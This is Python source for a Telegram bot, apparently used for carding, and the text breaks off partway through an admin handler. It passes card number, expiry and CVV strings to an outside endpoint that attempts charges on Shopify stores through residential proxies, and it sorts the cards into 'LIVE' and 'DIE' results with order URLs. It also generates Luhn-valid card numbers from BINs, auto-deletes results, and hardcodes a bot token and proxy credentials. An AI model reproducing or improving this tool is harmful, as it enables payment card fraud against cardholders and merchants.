import requests
import json
import time
import threading
import random

# ==================== CONFIGURATION ====================
BOT_TOKEN = "7326105005:AAHwps79h6NTVYzDBTrCdG8JoIdz39Gz_AA"
API_BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN

# Proxy for Telegram API (set if api.telegram.org is blocked in your country)
# Format: "http://user:pass@host:port" or "socks5://user:pass@host:port" or None to disable
# Example: TELEGRAM_PROXY = "http://127.0.0.1:7890"
TELEGRAM_PROXY = None  # <-- Set your proxy here if Telegram is blocked

# Default settings (using charge.py API)
DEFAULT_SITE = "https://shelf-co.com"
DEFAULT_PROXY = "geo.g-w.info:10080:user-P9tQgwy5zruWwzMa-type-residential-session-kxy6by9h-country-UK-rotation-15:3RpmDKUKGSdqJFJu"
API_ENDPOINT = "http://152.42.163.248/shopify.php"

# Auto-delete delay in seconds (120 = 1 minute and 30 second)
AUTO_DELETE_DELAY = 120

# Admin user IDs - these users can manage other users' settings
ADMIN_IDS = [1911136815]

# Per-USER settings (user_id -> {site, proxy})
# Each user has their own settings, does not affect others
user_settings = {}

# Bot running state - admin can stop/start processing
bot_running = True

def is_admin(user_id):
    """Check if user is admin"""
    return user_id in ADMIN_IDS

# ==================== TELEGRAM API ====================

def _tg_proxies():
    """Return proxies dict for Telegram API requests, or None"""
    if TELEGRAM_PROXY:
        return {"http": TELEGRAM_PROXY, "https": TELEGRAM_PROXY}
    return None

def send_message(chat_id, text, parse_mode="HTML"):
    """Send a message to a Telegram chat, returns message_id"""
    url = f"{API_BASE_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": parse_mode
    }
    try:
        resp = requests.post(url, json=payload, timeout=30, proxies=_tg_proxies())
        data = resp.json()
        if data.get("ok"):
            return data["result"]["message_id"]
        return None
    except Exception as e:
        print(f"[ERROR] Failed to send message: {e}")
        return None

def edit_message(chat_id, message_id, text, parse_mode="HTML"):
    """Edit an existing message"""
    url = f"{API_BASE_URL}/editMessageText"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id,
        "text": text,
        "parse_mode": parse_mode
    }
    try:
        resp = requests.post(url, json=payload, timeout=30, proxies=_tg_proxies())
        return resp.json()
    except:
        return None

def delete_message(chat_id, message_id):
    """Delete a message"""
    url = f"{API_BASE_URL}/deleteMessage"
    payload = {
        "chat_id": chat_id,
        "message_id": message_id
    }
    try:
        resp = requests.post(url, json=payload, timeout=10, proxies=_tg_proxies())
        return resp.json()
    except:
        return None

def schedule_delete(chat_id, message_id, delay=AUTO_DELETE_DELAY):
    """Schedule a message to be deleted after delay seconds"""
    def _delete():
        time.sleep(delay)
        delete_message(chat_id, message_id)
    thread = threading.Thread(target=_delete)
    thread.daemon = True
    thread.start()

def schedule_delete_multiple(chat_id, message_ids, delay=AUTO_DELETE_DELAY):
    """Schedule multiple messages to be deleted after delay seconds"""
    def _delete():
        time.sleep(delay)
        for msg_id in message_ids:
            if msg_id:
                delete_message(chat_id, msg_id)
                time.sleep(0.3)
    thread = threading.Thread(target=_delete)
    thread.daemon = True
    thread.start()

def get_updates(offset=None, timeout=30):
    """Get updates from Telegram (long polling)"""
    url = f"{API_BASE_URL}/getUpdates"
    params = {"timeout": timeout}
    if offset:
        params["offset"] = offset
    try:
        resp = requests.get(url, params=params, timeout=timeout + 10, proxies=_tg_proxies())
        return resp.json()
    except Exception as e:
        print(f"[ERROR] Failed to get updates: {e}")
        return None

def get_bot_info():
    """Get bot information"""
    url = f"{API_BASE_URL}/getMe"
    try:
        resp = requests.get(url, timeout=10, proxies=_tg_proxies())
        data = resp.json()
        if data.get("ok"):
            return data["result"]
    except:
        pass
    return None

# ==================== CARD PARSING ====================

def clean_input(text):
    """Remove quotes and extra whitespace"""
    text = text.strip()
    text = text.replace('"', '').replace("'", "").strip()
    return text

def parse_card_input(line):
    """Parse card input - extract number|month|year|cvv from anywhere in the text.
    
    Only accepts format: number|month|year|cvv
    - number: 13-19 digits
    - month: 1-2 digits (01-12)
    - year: 2 or 4 digits
    - cvv: 3 or 4 digits
    
    Anything before or after is automatically ignored.
    """
    import re
    line = clean_input(line)
    if not line:
        return None

    # Regex to find card pattern anywhere in the text
    # number(13-19 digits) | month(1-2 digits) | year(2-4 digits) | cvv(3-4 digits)
    pattern = r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})'
    match = re.search(pattern, line)
    
    if not match:
        return None
    
    card_number = match.group(1)
    month = match.group(2).zfill(2)  # Pad to 2 digits: 3 -> 03
    year = match.group(3)
    cvv = match.group(4)
    
    # Validate month
    if int(month) < 1 or int(month) > 12:
        return None
    
    # Normalize year to 4 digits
    if len(year) == 2:
        year = "20" + year
    
    check_format = f"{card_number}|{month}|{year}|{cvv}"
    return {"check_format": check_format, "extra_info": ""}

# ==================== API CHECK ====================

def check_card(card_format, site, proxy):
    """Call API to check card via charge.py API (152.42.163.248)"""
    full_url = f"{API_ENDPOINT}?site={site}&card={card_format}&proxy={proxy}"

    try:
        response = requests.get(full_url, timeout=120)
        return response.text.strip()
    except requests.exceptions.Timeout:
        return json.dumps({"response": "TIMEOUT", "price": "N/A"})
    except requests.exceptions.RequestException as e:
        return json.dumps({"response": f"CONNECTION_ERROR: {str(e)[:100]}", "price": "N/A"})

def parse_response(response_text):
    """Parse response from API"""
    response_text = response_text.strip()

    try:
        data = json.loads(response_text)
        result = {}
        result['price'] = data.get('Price', data.get('price', data.get('amount', data.get('total', 'N/A'))))
        result['response'] = data.get('Response', data.get('response', data.get('Message', data.get('message', data.get('msg', data.get('status', data.get('result', 'N/A')))))))
        result['order_url'] = data.get('order_url', data.get('orderUrl', data.get('Order', data.get('order', data.get('url', '')))))
        result['gate'] = data.get('Gate', data.get('gate', ''))
        result['site'] = data.get('Site', data.get('site', ''))
        return result
    except (json.JSONDecodeError, ValueError):
        pass

    result = {
        "response": response_text if response_text else "N/A",
        "price": "N/A",
        "order_url": ""
    }

    if '|' in response_text:
        parts = response_text.split('|')
        if len(parts) >= 1:
            result['response'] = parts[0].strip()
        if len(parts) >= 2:
            result['price'] = parts[1].strip()
        if len(parts) >= 3:
            result['order_url'] = parts[2].strip()

    return result

def is_live(response, order_url):
    """Check if card is LIVE"""
    response_upper = str(response).upper()

    if "ORDER_PLACED" in response_upper and order_url and len(order_url) > 10:
        return True

    live_keywords = ["CHARGED", "SUCCESS", "APPROVED"]
    for keyword in live_keywords:
        if keyword in response_upper:
            return True

    return False

def is_site_error(response):
    """Check if the error is a site-side issue (no product ID, site down, etc.)"""
    response_upper = str(response).upper()
    site_error_keywords = [
        "NO PRODUCT",
        "PRODUCT ID",
        "NO_PRODUCT",
        "PRODUCT_ID",
        "PRODUCT NOT FOUND",
        "NO ITEM",
        "CART ERROR",
        "SITE ERROR",
        "SITE_ERROR",
        "SITE DOWN",
        "SITE_DOWN",
        "CLOUDFLARE",
        "ACCESS DENIED",
        "FORBIDDEN",
        "RATE LIMIT",
        "RATE_LIMIT",
        "BLOCKED",
        "CAPTCHA",
    ]
    for keyword in site_error_keywords:
        if keyword in response_upper:
            return True
    return False

# ==================== GET USER SETTINGS ====================

def get_settings(user_id):
    """Get site and proxy settings for a specific user"""
    settings = user_settings.get(user_id, {})
    site = settings.get("site", DEFAULT_SITE)
    proxy = settings.get("proxy", DEFAULT_PROXY)
    return site, proxy

# ==================== COMMAND HANDLERS ====================

def handle_start(chat_id, user_msg_id):
    """Handle /start command"""
    text = (
        "🔥 <b>Card Checker Bot</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"

        "💳 <b>CHECK CARDS</b>\n"
        "<code>/chg 4111111111111111|03|2026|123</code>\n"
        "<code>/chg</code>  <i>(nhiều thẻ, mỗi dòng 1 thẻ)</i>\n\n"

        "🎲 <b>GENERATE CARDS</b>\n"
        "<code>/gen 414170</code>  — 10 thẻ ngẫu nhiên\n"
        "<code>/gen 414170 20</code>  — 20 thẻ\n"
        "<code>/gen 414170|03|2026</code>  — cố định exp\n\n"

        "⚙️ <b>SETTINGS</b>\n"
        "<code>/settings</code>  — Xem cài đặt hiện tại\n"
        "<code>/setsite URL</code>  — Đổi site\n"
        "<code>/setproxy host:port:user:pass</code>  — Đổi proxy\n"
        "<code>/resetsite</code>  /  <code>/resetproxy</code>  — Reset về mặc định\n"
        "<code>/listsite</code>  — Danh sách site khả dụng\n\n"

        "🔧 <b>TOOLS</b>\n"
        "<code>/myid</code>  — ID Telegram của bạn\n"
        "<code>/chatid</code>  — ID chat/group hiện tại\n"
        "<code>/info</code>  — Thông tin user (reply vào tin nhắn)\n\n"

        "👑 <b>ADMIN ONLY</b>\n"
        "<code>/stopbot</code>  — Dừng bot\n"
        "<code>/startbot</code>  — Chạy lại bot\n"
        "<code>/botstatus</code>  — Trạng thái bot\n"
        "<code>/adefaultsite URL</code>  — Đổi site mặc định\n"
        "<code>/adefaultproxy proxy</code>  — Đổi proxy mặc định\n"
        "<code>/asetsite ID URL</code>  — Đặt site cho user\n"
        "<code>/asetproxy ID proxy</code>  — Đặt proxy cho user\n"
        "<code>/aview ID</code>  — Xem settings của user\n"
        "<code>/areset ID</code>  — Reset settings của user\n"
        "<code>/listusers</code>  — Danh sách users\n\n"

        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "📌 Format: <code>số_thẻ|mm|yyyy|cvv</code>\n"
        "🗑️ Kết quả tự xóa sau 1 phút"
    )
    msg_id = send_message(chat_id, text)
    # Auto-delete both user command and bot reply
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_settings(chat_id, user_id, user_msg_id):
    """Handle /settings command"""
    site, proxy = get_settings(user_id)
    proxy_display = proxy[:50] + "..." if len(proxy) > 50 else proxy
    text = (
        "⚙️ <b>Your Settings</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>Site:</b>\n<code>{site}</code>\n\n"
        f"🔒 <b>Proxy:</b>\n<code>{proxy_display}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Use /setsite or /setproxy to change\n"
        "⚠️ Settings are personal, won't affect others."
    )
    msg_id = send_message(chat_id, text)
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_setproxy(chat_id, user_id, text, user_msg_id):
    """Handle /setproxy command"""
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        msg_id = send_message(chat_id, "❌ Usage: <code>/setproxy your_proxy_string</code>\n\nExample:\n<code>/setproxy host:port:user:pass</code>")
        schedule_delete_multiple(chat_id, [user_msg_id, msg_id])
        return

    new_proxy = parts[1].strip()
    if user_id not in user_settings:
        user_settings[user_id] = {}
    user_settings[user_id]["proxy"] = new_proxy

    proxy_display = new_proxy[:50] + "..." if len(new_proxy) > 50 else new_proxy
    msg_id = send_message(chat_id, f"✅ Your proxy updated!\n\n🔒 New proxy:\n<code>{proxy_display}</code>\n\n⚠️ Only affects your checks.")
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_setsite(chat_id, user_id, text, user_msg_id):
    """Handle /setsite command"""
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        msg_id = send_message(chat_id, "❌ Usage: <code>/setsite https://store.myshopify.com</code>")
        schedule_delete_multiple(chat_id, [user_msg_id, msg_id])
        return

    new_site = parts[1].strip()
    if not new_site.startswith("http"):
        new_site = "https://" + new_site

    if user_id not in user_settings:
        user_settings[user_id] = {}
    user_settings[user_id]["site"] = new_site

    msg_id = send_message(chat_id, f"✅ Your site updated!\n\n🌐 New site:\n<code>{new_site}</code>\n\n⚠️ Only affects your checks.")
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_resetproxy(chat_id, user_id, user_msg_id):
    """Handle /resetproxy command"""
    if user_id in user_settings and "proxy" in user_settings[user_id]:
        del user_settings[user_id]["proxy"]
    msg_id = send_message(chat_id, f"✅ Your proxy reset to default!")
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_resetsite(chat_id, user_id, user_msg_id):
    """Handle /resetsite command"""
    if user_id in user_settings and "site" in user_settings[user_id]:
        del user_settings[user_id]["site"]
    msg_id = send_message(chat_id, f"✅ Your site reset to default!\n\n🌐 Default site:\n<code>{DEFAULT_SITE}</code>")
    schedule_delete_multiple(chat_id, [user_msg_id, msg_id])

def handle_listsite(chat_id, user_id, text, user_msg_id):
    """Handle /listsite command - show available sites from site.txt, with optional page"""
    msg_ids_to_delete = [user_msg_id]

    # Parse optional page number: /listsite 2
    parts = text.split(maxsplit=1)
    page = 1
    if len(parts) > 1:
        try:
            page = max(1, int(parts[1].strip()))
        except ValueError:
            page = 1

    # Load sites from site.txt
    sites = []
    try:
        with open("site.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and line.startswith("http"):
                    sites.append(line)
    except FileNotFoundError:
        msg_id = send_message(chat_id, "❌ site.txt not found!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    if not sites:
        msg_id = send_message(chat_id, "❌ No sites found in site.txt!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    per_page = 20
    total_pages = (len(sites) + per_page - 1) // per_page
    page = min(page, total_pages)
    start_idx = (page - 1) * per_page
    end_idx = start_idx + per_page
    page_sites = sites[start_idx:end_idx]

    current_site, _ = get_settings(user_id)

    text_out = (
        f"🌐 <b>Available Sites</b> (Page {page}/{total_pages})\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Total: {len(sites)} sites\n"
        f"⚙️ Your current: <code>{current_site}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    for i, s in enumerate(page_sites, start=start_idx + 1):
        marker = " ◀ current" if s == current_site else ""
        text_out += f"{i}. <code>{s}</code>{marker}\n"

    text_out += (
        f"\n━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💡 Dùng: <code>/setsite URL</code> để đổi site\n"
    )
    if total_pages > 1:
        text_out += f"📄 Trang tiếp: <code>/listsite {page + 1}</code>\n" if page < total_pages else ""
    text_out += (
        f"\n⚠️ Nếu bị lỗi 'no product ID':\n"
        f"  → Site hiện tại không có sản phẩm hoặc bị chặn\n"
        f"  → Thử đổi sang site khác trong danh sách này"
    )

    msg_id = send_message(chat_id, text_out)
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_chg(chat_id, user_id, text, user_name, user_msg_id):
    """Handle /chg command - check cards"""
    # Collect all message IDs to delete later
    msg_ids_to_delete = [user_msg_id]

    # Parse cards from message
    lines = text.split('\n')
    first_line = lines[0]
    first_line_parts = first_line.split(maxsplit=1)

    cards_text = []
    if len(first_line_parts) > 1:
        cards_text.append(first_line_parts[1].strip())

    for line in lines[1:]:
        line = line.strip()
        if line:
            cards_text.append(line)

    if not cards_text:
        msg_id = send_message(chat_id,
            "❌ No cards found!\n\n"
            "📋 Usage:\n"
            "<code>/chg 5426340331431119|11|2026|079</code>\n\n"
            "Or multiple cards:\n"
            "<code>/chg\n"
            "4147181435715762|10|2030|057\n"
            "5426340331431119|11|2026|079</code>"
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    # Parse all cards
    parsed_cards = []
    invalid_lines = []
    for card_text in cards_text:
        parsed = parse_card_input(card_text)
        if parsed:
            parsed_cards.append(parsed)
        else:
            invalid_lines.append(card_text)

    if not parsed_cards:
        msg_id = send_message(chat_id, "❌ No valid cards found! Check your format.\n\nSupported: <code>card|mm|yyyy|cvv</code>")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    # Get THIS USER's settings (not chat-wide)
    site, proxy = get_settings(user_id)

    # Send initial status message
    total = len(parsed_cards)
    status_text = (
        f"🔄 <b>Checking {total} card(s)...</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {user_name}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"⏳ Processing..."
    )

    if invalid_lines:
        status_text += f"\n\n⚠️ Skipped {len(invalid_lines)} invalid line(s)"

    status_msg_id = send_message(chat_id, status_text)
    msg_ids_to_delete.append(status_msg_id)

    # Check each card
    results_text = []
    live_count = 0
    die_count = 0
    start_time = time.time()

    for i, card_data in enumerate(parsed_cards, 1):
        card_format = card_data['check_format']
        extra_info = card_data['extra_info']

        # Call API
        response_text = check_card(card_format, site, proxy)
        data = parse_response(response_text)

        price = data.get('price', 'N/A')
        response = data.get('response', 'N/A')
        order_url = data.get('order_url', '')
        gate = data.get('gate', '')

        # Determine LIVE/DIE/SITE_ERROR
        if is_live(response, order_url):
            status = "LIVE"
            emoji = "✅"
            live_count += 1
        elif is_site_error(response):
            status = "SITE_ERR"
            emoji = "⚠️"
            die_count += 1
        else:
            status = "DIE"
            emoji = "❌"
            die_count += 1

        # Build result line
        result_line = f"{emoji} <code>{card_format}</code> | {price} | {response} | {status}"

        if extra_info:
            result_line += f" | {extra_info}"

        if status == "LIVE" and order_url:
            result_line += f"\n   📦 <a href='{order_url}'>Order URL</a>"

        if gate:
            result_line += f" | {gate}"

        results_text.append(result_line)

        # Update status message
        update_interval = 1 if total <= 10 else 3
        if status_msg_id and (i % update_interval == 0 or i == total):
            elapsed = int(time.time() - start_time)
            progress_text = (
                f"🔄 <b>Checking {total} card(s)...</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 User: {user_name}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"📊 Progress: {i}/{total}\n"
                f"✅ Live: {live_count} | ❌ Die: {die_count}\n"
                f"⏱️ Elapsed: {elapsed}s\n\n"
            )
            progress_text += "\n".join(results_text[-5:])
            if i < total:
                progress_text += f"\n\n⏳ Checking next card..."

            edit_message(chat_id, status_msg_id, progress_text)

        # Delay between requests
        if i < total:
            time.sleep(15)

    # Final summary
    elapsed = int(time.time() - start_time)
    mins = elapsed // 60
    secs = elapsed % 60

    # Check if all results were site errors
    site_error_count = sum(1 for r in results_text if "SITE_ERR" in r)
    all_site_errors = site_error_count == total

    final_text = (
        f"📊 <b>CHECK COMPLETED</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 User: {user_name}\n"
        f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
        f"⏱️ Time: {mins}m {secs}s\n"
        f"🌐 Site: <code>{site}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
    )

    if all_site_errors or site_error_count > 0:
        final_text += (
            f"⚠️ <b>SITE ERROR DETECTED ({site_error_count}/{total})</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"❗ Lý do: Site <code>{site}</code> không có product ID\n\n"
            f"🔍 <b>Nguyên nhân có thể:</b>\n"
            f"  • Site hết hàng / không có sản phẩm public\n"
            f"  • Site bị Cloudflare / bot protection chặn\n"
            f"  • Proxy bị block bởi site này\n"
            f"  • Site đã thay đổi cấu trúc Shopify\n\n"
            f"✅ <b>Cách fix:</b>\n"
            f"  • Dùng <code>/listsite</code> để xem danh sách site khác\n"
            f"  • Dùng <code>/setsite URL</code> để đổi sang site khác\n"
            f"  • Dùng <code>/setproxy</code> để đổi proxy\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        )

    final_text += "\n".join(results_text)
    final_text += f"\n\n🗑️ <i>This message will be deleted in {AUTO_DELETE_DELAY}s</i>"

    # Update or send final result
    if status_msg_id:
        if len(final_text) > 4000:
            edit_message(chat_id, status_msg_id, "📊 Check completed! See results below ⬇️")
            chunk = ""
            for line in results_text:
                if len(chunk) + len(line) + 2 > 3500:
                    chunk_msg_id = send_message(chat_id, chunk)
                    msg_ids_to_delete.append(chunk_msg_id)
                    chunk = ""
                chunk += line + "\n"
            if chunk:
                chunk_msg_id = send_message(chat_id, chunk)
                msg_ids_to_delete.append(chunk_msg_id)
            summary = (
                f"\n📊 <b>SUMMARY</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Total: {total} | ✅ Live: {live_count} | ❌ Die: {die_count}\n"
                f"⏱️ Time: {mins}m {secs}s\n"
                f"🗑️ <i>Auto-delete in {AUTO_DELETE_DELAY}s</i>"
            )
            summary_msg_id = send_message(chat_id, summary)
            msg_ids_to_delete.append(summary_msg_id)
        else:
            edit_message(chat_id, status_msg_id, final_text)

    # Schedule auto-delete of ALL messages (user command + all bot replies)
    schedule_delete_multiple(chat_id, msg_ids_to_delete, delay=AUTO_DELETE_DELAY)

# ==================== CARD GENERATION (BIN-based) ====================

def luhn_checksum(card_number):
    """Calculate Luhn checksum digit"""
    digits = [int(d) for d in str(card_number)]
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    total = sum(odd_digits)
    for d in even_digits:
        total += sum(divmod(d * 2, 10))
    return total % 10

def generate_card_number(bin_prefix, length=16):
    """Generate a valid card number from BIN using Luhn algorithm"""
    # Fill remaining digits randomly (except last check digit)
    card = str(bin_prefix)
    while len(card) < length - 1:
        card += str(random.randint(0, 9))
    
    # Calculate check digit
    for check in range(10):
        candidate = card + str(check)
        if luhn_checksum(candidate) == 0:
            return candidate
    return card + "0"

def detect_card_brand(bin_prefix):
    """Detect card brand from BIN"""
    b = str(bin_prefix)
    if b.startswith("4"):
        return "VISA"
    elif b.startswith(("51", "52", "53", "54", "55")):
        return "MASTERCARD"
    elif b.startswith(("2221", "2222", "2223", "2224", "2225", "2226", "2227", "2228", "2229",
                       "223", "224", "225", "226", "227", "228", "229",
                       "23", "24", "25", "26", "270", "271", "2720")):
        return "MASTERCARD"
    elif b.startswith(("34", "37")):
        return "AMEX"
    elif b.startswith(("6011", "644", "645", "646", "647", "648", "649", "65")):
        return "DISCOVER"
    elif b.startswith(("3528", "3529", "353", "354", "355", "356", "357", "358")):
        return "JCB"
    elif b.startswith(("300", "301", "302", "303", "304", "305", "36", "38")):
        return "DINERS"
    else:
        return "UNKNOWN"

def generate_cards(bin_prefix, count=10, month=None, year=None, cvv=None):
    """Generate cards from BIN prefix"""
    brand = detect_card_brand(bin_prefix)
    
    # Card length based on brand
    if brand == "AMEX":
        card_length = 15
        cvv_length = 4
    else:
        card_length = 16
        cvv_length = 3
    
    cards = []
    for _ in range(count):
        card_num = generate_card_number(bin_prefix, card_length)
        
        # Random expiry if not specified
        if month:
            m = month
        else:
            m = str(random.randint(1, 12)).zfill(2)
        
        if year:
            y = year
        else:
            y = str(random.randint(2025, 2031))
        
        # Random CVV if not specified
        if cvv:
            c = cvv
        else:
            c = ''.join([str(random.randint(0, 9)) for _ in range(cvv_length)])
        
        cards.append(f"{card_num}|{m}|{y}|{c}")
    
    return cards, brand

def handle_gen(chat_id, text, user_msg_id):
    """Handle /gen command - generate cards from BIN
    
    Formats:
        /gen 414170          -> gen 10 cards with random exp/cvv
        /gen 414170 20       -> gen 20 cards
        /gen 414170|03|2026  -> gen with specific month/year
        /gen 414170|03|2026|699 -> gen with specific month/year/cvv
    """
    msg_ids_to_delete = [user_msg_id]
    
    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        msg_id = send_message(chat_id,
            "❌ Usage:\n\n"
            "<code>/gen 414170</code> — Gen 10 cards\n"
            "<code>/gen 414170 20</code> — Gen 20 cards\n"
            "<code>/gen 414170|03|2026</code> — With exp\n"
            "<code>/gen 414170|03|2026|699</code> — With exp+cvv\n"
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    args = parts[1].strip()
    
    # Parse BIN and optional count
    arg_parts = args.split()
    bin_part = arg_parts[0]
    count = 10  # default
    
    if len(arg_parts) > 1:
        try:
            count = int(arg_parts[1])
            count = min(count, 50)  # Max 50 cards
            count = max(count, 1)
        except ValueError:
            pass
    
    # Parse BIN with optional exp/cvv
    bin_fields = bin_part.split('|')
    bin_prefix = bin_fields[0].strip()
    
    # Validate BIN (must be 4-8 digits)
    if not bin_prefix.isdigit() or len(bin_prefix) < 4 or len(bin_prefix) > 8:
        msg_id = send_message(chat_id, "❌ Invalid BIN! Must be 4-8 digits.\n\nExample: <code>/gen 414170</code>")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    month = None
    year = None
    cvv = None
    
    if len(bin_fields) >= 2 and bin_fields[1].strip():
        month = bin_fields[1].strip().zfill(2)
    if len(bin_fields) >= 3 and bin_fields[2].strip():
        y = bin_fields[2].strip()
        year = "20" + y if len(y) == 2 else y
    if len(bin_fields) >= 4 and bin_fields[3].strip():
        cvv = bin_fields[3].strip()
    
    # Generate
    cards, brand = generate_cards(bin_prefix, count, month, year, cvv)
    
    # Format output
    result = (
        f"🎲 <b>Generated {count} Cards</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 BIN: <code>{bin_prefix}</code>\n"
        f"🏷️ Brand: {brand}\n"
    )
    if month:
        result += f"📅 Month: {month}\n"
    if year:
        result += f"📅 Year: {year}\n"
    if cvv:
        result += f"🔑 CVV: {cvv}\n"
    result += f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    card_lines = "\n".join([f"<code>{c}</code>" for c in cards])
    result += card_lines
    
    result += f"\n\n🗑️ <i>Auto-delete in {AUTO_DELETE_DELAY}s</i>"
    
    if len(result) > 4000:
        # Split into chunks
        msg_id = send_message(chat_id, f"🎲 <b>Generated {count} {brand} cards from BIN {bin_prefix}</b>")
        msg_ids_to_delete.append(msg_id)
        chunk = ""
        for c in cards:
            line = f"<code>{c}</code>\n"
            if len(chunk) + len(line) > 3500:
                chunk_id = send_message(chat_id, chunk)
                msg_ids_to_delete.append(chunk_id)
                chunk = ""
            chunk += line
        if chunk:
            chunk_id = send_message(chat_id, chunk)
            msg_ids_to_delete.append(chunk_id)
    else:
        msg_id = send_message(chat_id, result)
        msg_ids_to_delete.append(msg_id)
    
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

# ==================== ADMIN COMMANDS ====================

def handle_admin_defaultsite(chat_id, user_id, text, user_msg_id):
    """Admin: /adefaultsite URL - change DEFAULT_SITE for ALL users (global)"""
    global DEFAULT_SITE
    msg_ids_to_delete = [user_msg_id]

    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        msg_id = send_message(chat_id,
            f"❌ Usage: <code>/adefaultsite URL</code>\n\n"
            f"🌐 Current default: <code>{DEFAULT_SITE}</code>\n\n"
            f"This changes the default site for ALL users who haven't set their own site."
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    new_site = parts[1].strip()
    if not new_site.startswith("http"):
        new_site = "https://" + new_site

    old_site = DEFAULT_SITE
    DEFAULT_SITE = new_site

    msg_id = send_message(chat_id,
        f"✅ <b>[ADMIN] Default site changed for ALL users!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Old: <code>{old_site}</code>\n"
        f"🌐 New: <code>{DEFAULT_SITE}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ Users with custom /setsite are NOT affected.\n"
        f"👥 All other users will now use this site."
    )
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id):
    """Admin: /adefaultproxy proxy - change DEFAULT_PROXY for ALL users (global)"""
    global DEFAULT_PROXY
    msg_ids_to_delete = [user_msg_id]

    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    parts = text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        proxy_display = DEFAULT_PROXY[:50] + "..." if len(DEFAULT_PROXY) > 50 else DEFAULT_PROXY
        msg_id = send_message(chat_id,
            f"❌ Usage: <code>/adefaultproxy proxy_string</code>\n\n"
            f"🔒 Current default: <code>{proxy_display}</code>\n\n"
            f"This changes the default proxy for ALL users who haven't set their own proxy."
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    new_proxy = parts[1].strip()
    old_proxy = DEFAULT_PROXY[:50] + "..." if len(DEFAULT_PROXY) > 50 else DEFAULT_PROXY
    DEFAULT_PROXY = new_proxy
    new_proxy_display = new_proxy[:50] + "..." if len(new_proxy) > 50 else new_proxy

    msg_id = send_message(chat_id,
        f"✅ <b>[ADMIN] Default proxy changed for ALL users!</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔄 Old: <code>{old_proxy}</code>\n"
        f"🔒 New: <code>{new_proxy_display}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⚠️ Users with custom /setproxy are NOT affected.\n"
        f"👥 All other users will now use this proxy."
    )
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_admin_setproxy(chat_id, user_id, text, user_msg_id):
    """Admin: /asetproxy @username proxy_string"""
    msg_ids_to_delete = [user_msg_id]
    
    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    # Format: /asetproxy user_id proxy_string
    parts = text.split(maxsplit=2)
    if len(parts) < 3:
